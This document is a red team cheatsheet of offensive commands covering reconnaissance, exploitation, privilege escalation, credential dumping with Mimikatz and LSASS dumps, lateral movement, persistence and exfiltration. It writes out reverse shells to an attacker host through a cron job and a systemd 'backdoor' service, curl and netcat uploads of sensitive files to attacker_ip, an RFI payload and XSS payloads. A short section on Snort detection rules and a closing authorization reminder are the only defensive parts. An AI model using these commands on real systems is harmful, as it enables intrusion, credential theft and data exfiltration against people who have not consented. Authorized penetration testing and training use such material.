# Red Team Cheatsheets

This document provides a collection of essential commands and one-liners for various phases of red team operations.

## 1. Reconnaissance & OSINT

### Subdomain Enumeration
*   **Subfinder:** Fast passive subdomain enumeration.
    ```bash
    subfinder -d example.com -o example_subs.txt
    ```
*   **Amass:** Comprehensive subdomain enumeration and network mapping.
    ```bash
    amass enum -d example.com
    ```

### Port Scanning & Service Enumeration (Nmap)
*   **Basic TCP Scan:** Scan common ports.
    ```bash
    nmap -sT example.com
    ```
*   **SYN Scan (Stealth Scan):** Faster and less noisy than TCP connect scan.
    ```bash
    nmap -sS example.com
    ```
*   **Service Version Detection & OS Detection:** Identify services and operating systems.
    ```bash
    nmap -sV -O example.com
    ```
*   **Aggressive Scan:** Enables OS detection, version detection, script scanning, and traceroute.
    ```bash
    nmap -A example.com
    ```
*   **Scan Specific Ports:** Scan a range or list of ports.
    ```bash
    nmap -p 21,22,80,443,3389 example.com
    nmap -p 1-65535 example.com
    ```
*   **Output to File:** Save scan results in different formats.
    ```bash
    nmap -sV -sC -oN normal_output.txt -oX xml_output.xml example.com
    ```

### Web Technology Fingerprinting
*   **WhatWeb:** Identify web technologies.
    ```bash
    whatweb example.com
    ```
*   **HTTPX:** Fast and multi-purpose HTTP toolkit.
    ```bash
    httpx -l subdomains.txt -tech-detect -status-code -title
    ```

## 2. Initial Access & Exploitation

### Web Application Attacks (Basic)
*   **SQL Injection (SQLMap):** Automate SQL injection process.
    ```bash
    sqlmap -u "http://example.com/vulnerable.php?id=1" --batch --dump
    ```
*   **Cross-Site Scripting (XSS) Payloads:** Common XSS payloads.
    ```html
    <script>alert(document.domain)</script>
    <img src=x onerror=alert(1)>
    ```
*   **Local File Inclusion (LFI) / Remote File Inclusion (RFI) Examples:**
    ```
    http://example.com/page.php?file=../../../../etc/passwd
    http://example.com/page.php?file=http://attacker.com/shell.txt
    ```

### Metasploit (Basic Usage)
*   **Start Metasploit Console:**
    ```bash
    msfconsole
    ```
*   **Search for Exploits:**
    ```
    search cve:2021 type:exploit platform:windows
    ```
*   **Use an Exploit/Auxiliary Module:**
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    ```
*   **Show Options:** Display required and optional parameters.
    ```
    show options
    ```
*   **Set Options:** Configure parameters.
    ```
    set RHOSTS 192.168.1.100
    set LHOST 192.168.1.5
    set PAYLOAD windows/meterpreter/reverse_tcp
    ```
*   **Run Exploit:**
    ```
    exploit
    ```

This is a starting point. More detailed commands and techniques will be added for each section, including post-exploitation, privilege escalation, lateral movement, and persistence.



## 3. Post-Exploitation & Privilege Escalation

### Linux Privilege Escalation
*   **LinPEAS:** Script to enumerate potential privilege escalation paths on Linux.
    ```bash
    ./linpeas.sh
    ```
*   **Sudo Vulnerabilities:** Check for misconfigured sudo permissions.
    ```bash
    sudo -l
    ```
*   **SUID/SGID Binaries:** Find SUID/SGID binaries that can be exploited.
    ```bash
    find / -perm -4000 -o -perm -2000 2>/dev/null
    ```
*   **Kernel Exploits:** Check kernel version for known vulnerabilities.
    ```bash
    uname -a
    ```
*   **Cron Jobs:** Check for vulnerable cron jobs.
    ```bash
    cat /etc/crontab
    ls -la /etc/cron.*
    ```

### Windows Privilege Escalation
*   **WinPEAS:** Script to enumerate potential privilege escalation paths on Windows.
    ```powershell
    .\[WinPEASx64.exe](http://WinPEASx64.exe)
    ```
*   **System Information:** Gather basic system information.
    ```powershell
    systeminfo
    ```
*   **User and Group Information:** Enumerate users and groups.
    ```powershell
    net user
    net localgroup administrators
    ```
*   **Scheduled Tasks:** Check for vulnerable scheduled tasks.
    ```powershell
    schtasks /query /fo LIST /v
    ```
*   **Unquoted Service Paths:** Find services with unquoted paths that can be exploited.
    ```powershell
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\system32\\"
    ```
*   **AlwaysInstallElevated:** Check if MSI packages can be installed with elevated privileges.
    ```powershell
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```

### Credential Access
*   **Mimikatz (Windows):** Extract credentials from memory.
    ```powershell
    privilege::debug
    sekurlsa::logonpasswords
    ```
*   **LSASS Dump (Windows):** Dump LSASS process for offline credential extraction.
    ```powershell
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```
*   **Password Hashes (Linux):** Locate and read `/etc/shadow` (requires root).
    ```bash
    cat /etc/shadow
    ```

## 4. Lateral Movement

### Windows Lateral Movement
*   **PsExec:** Execute commands on remote Windows systems.
    ```powershell
    PsExec.exe \\target_ip -u username -p password command
    ```
*   **WMI (Windows Management Instrumentation):** Execute commands remotely.
    ```powershell
    wmic /node:target_ip /user:username /password:password process call create "cmd.exe /c command"
    ```
*   **SMB/Admin Shares:** Access administrative shares.
    ```powershell
    net use \\target_ip\c$ password /user:username
    ```
*   **Pass-the-Hash (PTH):** Authenticate to a remote system using an NTLM hash instead of a plaintext password.
    ```powershell
    # Using Mimikatz
    sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:"cmd.exe"
    ```

### Linux Lateral Movement
*   **SSH:** Use compromised SSH keys or credentials.
    ```bash
    ssh -i id_rsa user@target_ip
    sshpass -p 'password' ssh user@target_ip
    ```
*   **SCP:** Securely copy files between hosts.
    ```bash
    scp file.txt user@target_ip:/path/to/destination
    ```

## 5. Persistence

### Linux Persistence
*   **SSH Authorized Keys:** Add attacker's public key to `~/.ssh/authorized_keys`.
    ```bash
    echo "ssh-rsa AAAAB3NzaC..." >> ~/.ssh/authorized_keys
    ```
*   **Cron Jobs:** Create a new cron job for reverse shell or backdoor.
    ```bash
    (crontab -l; echo "* * * * * nc -e /bin/bash attacker_ip 4444")|crontab -
    ```
*   **Systemd Services:** Create a custom systemd service.
    ```bash
    # Example /etc/systemd/system/backdoor.service
    [Unit]
    Description=My Backdoor Service
    After=network.target

    [Service]
    ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
    Restart=always

    [Install]
    WantedBy=multi-user.target
    ```
    ```bash
    systemctl enable backdoor.service
    systemctl start backdoor.service
    ```

### Windows Persistence
*   **Registry Run Keys:** Add programs to run at startup.
    ```powershell
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Path\To\backdoor.exe" /f
    ```
*   **Scheduled Tasks:** Create a new scheduled task.
    ```powershell
    schtasks /create /tn "Backdoor" /tr "C:\Path\To\backdoor.exe" /sc ONLOGON /rl HIGHEST
    ```
*   **Startup Folder:** Place executable in the startup folder.
    ```powershell
    copy backdoor.exe "C:\Users\Public\Start Menu\Programs\Startup\"
    ```
*   **Service Creation:** Create a new Windows service.
    ```powershell
    sc create "BackdoorService" binPath="C:\Path\To\backdoor.exe" start= auto
    sc start "BackdoorService"
    ```

## 6. Data Exfiltration

### Common Exfiltration Methods
*   **HTTP/HTTPS:** Transfer files over HTTP/HTTPS.
    ```bash
    # Linux (using curl)
    curl -F "file=@/path/to/sensitive.zip" http://attacker_ip/upload.php

    # Windows (using PowerShell)
    Invoke-WebRequest -Uri http://attacker_ip/upload.php -Method POST -InFile C:\Path\To\sensitive.zip
    ```
*   **DNS Tunneling:** Exfiltrate data over DNS queries.
    ```bash
    # Example (requires a DNS tunneling tool like Iodine or Dnscat2)
    # On victim:
    dnscat2-client --exec "powershell.exe" attacker.com
    # On attacker:
    dnscat2 --dns "domain=attacker.com,host=0.0.0.0"
    ```
*   **FTP/SFTP:** Transfer files using FTP/SFTP clients.
    ```bash
    ftp attacker_ip
    put sensitive.zip
    ```
*   **SMB:** Copy files to an attacker-controlled SMB share.
    ```powershell
    copy C:\Path\To\sensitive.zip \\attacker_ip\share
    ```

## 7. Command and Control (C2) Interaction

### General C2 Concepts
*   **Beaconing:** Regular communication from the compromised host to the C2 server.
*   **Payloads:** The malicious code executed on the target.
*   **Listeners:** Components on the C2 server waiting for incoming connections.
*   **Profiles:** Configuration files that define C2 communication patterns (e.g., Malleable C2 profiles for Cobalt Strike).

### Example C2 Framework Commands (Conceptual - specific commands vary by framework)
*   **Generate Payload:**
    ```
    generate_payload --format exe --listener http_beacon --output /tmp/beacon.exe
    ```
*   **Start Listener:**
    ```
    listener_start --name http_beacon --port 80 --profile default.profile
    ```
*   **Interact with Session:**
    ```
    sessions -i 1
    shell whoami
    upload /local/path /remote/path
    download /remote/path /local/path
    screenshot
    ```

This cheatsheet will be continuously updated with more advanced techniques and tool-specific commands.



## 8. Wireless Attacks

### Wi-Fi Cracking (WPA/WPA2-PSK)
*   **Monitor Mode:** Put wireless adapter into monitor mode.
    ```bash
    airmon-ng start wlan0
    ```
*   **Capture Handshake:** Capture WPA/WPA2 handshake.
    ```bash
    airodump-ng -c <channel> --bssid <AP_MAC> -w <output_file> wlan0mon
    ```
*   **Deauthentication Attack:** Disconnect clients to force handshake capture.
    ```bash
    aireplay-ng --deauth 0 -a <AP_MAC> -c <Client_MAC> wlan0mon
    ```
*   **Crack Handshake:** Use Aircrack-ng with a wordlist.
    ```bash
    aircrack-ng -w /path/to/wordlist.txt <output_file>.cap
    ```

### Evil Twin Attack (Conceptual)
*   **Setup Fake AP:** Create a rogue access point with the same SSID as a legitimate one.
    *   Tools like `hostapd` and `dnsmasq` are used for this.
*   **Deauthenticate Legitimate Clients:** Force clients to connect to your fake AP.
*   **Capture Credentials:** Redirect traffic through your AP to capture credentials (e.g., captive portal).

### Bluetooth Reconnaissance
*   **Scan for Devices:** Discover nearby Bluetooth devices.
    ```bash
    hcitool scan
    ```
*   **Bluetooth Low Energy (BLE) Scan:**
    ```bash
    bluetoothctl scan on
    ```

## 9. Snort IDS/IPS Rules and Usage

Snort is an open-source network intrusion detection system (IDS) and intrusion prevention system (IPS). It performs real-time traffic analysis and packet logging.

### Snort Modes
*   **Sniffer Mode:** Read IP packets and display them on the console.
    ```bash
    snort -v
    ```
*   **Packet Logger Mode:** Log packets to disk.
    ```bash
    snort -dev -l ./log
    ```
*   **NIDS (Network Intrusion Detection System) Mode:** Use rules to detect malicious activity.
    ```bash
    snort -c /etc/snort/snort.conf -i eth0
    ```

### Basic Snort Rule Structure

```
alert tcp any any -> 192.168.1.10 80 (msg:"Web Exploit Attempt"; content:"cmd.exe"; sid:1000001; rev:1;)
```

*   **Action:** `alert`, `log`, `pass`, `drop`, `reject`, `sdrop`
*   **Protocol:** `ip`, `icmp`, `tcp`, `udp`
*   **Source/Destination IP:** `any`, specific IP, or IP range
*   **Source/Destination Port:** `any`, specific port, or port range
*   **Direction Operator:** `->` (unidirectional), `<>` (bidirectional)
*   **Rule Options (within parentheses):**
    *   `msg`: Message to display when the rule fires.
    *   `content`: Look for specific content in the packet payload.
    *   `sid`: Snort ID (unique identifier for the rule).
    *   `rev`: Revision number of the rule.
    *   `flow`: Define the direction of the flow (e.g., `to_client`, `to_server`).
    *   `classtype`: Categorize the type of attack.

### Example Snort Rules

*   **Detecting a simple web attack (e.g., `cmd.exe` in URI):**
    ```snort
    alert tcp any any -> $HOME_NET $HTTP_PORTS (msg:"Attempted cmd.exe access in URI"; flow:to_server,established; uricontent:"cmd.exe"; sid:1000002; rev:1;)
    ```
*   **Detecting Nmap XMAS scan:**
    ```snort
    alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"NMAP XMAS Tree Scan"; flags:FPU; sid:1000003; rev:1;)
    ```
*   **Detecting SQL Injection attempt (basic):**
    ```snort
    alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SQL Injection Attempt - Basic"; flow:to_server,established; content:"' OR 1=1"; nocase; sid:1000004; rev:1;)
    ```

## 10. File System Operations & Data Manipulation

### Linux/Unix Commands
*   **Find Sensitive Files:**
    ```bash
    find / -name "id_rsa" 2>/dev/null
    find / -name "*.conf" -o -name "*.log" 2>/dev/null
    find / -type f -perm /0002 2>/dev/null # World-writable files
    ```
*   **Read Files:**
    ```bash
    cat /etc/passwd
    less /var/log/auth.log
    head -n 10 /etc/shadow
    tail -n 20 /var/log/syslog
    ```
*   **Write/Append to Files:**
    ```bash
    echo "malicious content" > file.txt
    echo "more content" >> file.txt
    ```
*   **Transfer Files (Netcat):** Simple file transfer.
    *   **Listener (Attacker):**
        ```bash
        nc -lvnp 1234 > received_file.txt
        ```
    *   **Sender (Victim):**
        ```bash
        nc attacker_ip 1234 < file_to_send.txt
        ```
*   **Process Management:**
    ```bash
    ps aux | grep <process_name>
    kill <pid>
    ```

### Windows Commands (cmd.exe / PowerShell)
*   **List Directory Contents:**
    ```cmd
    dir C:\Users\Public
    ```
*   **Read File Content:**
    ```cmd
    type C:\Windows\System32\drivers\etc\hosts
    ```
*   **Find Files:**
    ```cmd
    dir /s /b C:\Users\*.txt
    ```
*   **Network Configuration:**
    ```cmd
    ipconfig /all
    netstat -ano
    ```
*   **Firewall Rules:**
    ```cmd
    netsh advfirewall firewall show rule name=all
    ```
*   **Process Management:**
    ```cmd
    tasklist
    taskkill /PID <pid> /F
    ```
*   **PowerShell Web Download:**
    ```powershell
    Invoke-WebRequest -Uri http://attacker_ip/tool.exe -OutFile C:\tool.exe
    ```

This cheatsheet aims to be a living document, continuously updated with new techniques and commands as the red teaming landscape evolves. Always ensure you have proper authorization before performing any of these actions in a real environment.

